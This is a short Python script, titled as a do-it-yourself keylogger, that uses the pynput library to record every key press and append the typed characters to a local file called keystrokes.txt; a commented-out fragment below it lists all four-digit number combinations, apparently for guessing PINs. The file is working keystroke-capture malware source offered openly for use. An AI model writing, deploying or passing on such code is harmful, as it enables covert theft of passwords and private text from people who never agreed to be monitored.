#make a keylogger yourself
#py -m pip install pynput
from pynput import keyboard 

def keypressed(key):
    print(str(key))
    with open("keystrokes.txt",'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("Error!")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keypressed)
    listener.start()
    input()

# Generate all 4-digit combinations using digits 0-9
# combinations = product(range(10), repeat=4)

# Print each combination
# for combo in combinations:
 #   code = ''.join(map(str, combo))
 #     print(code)
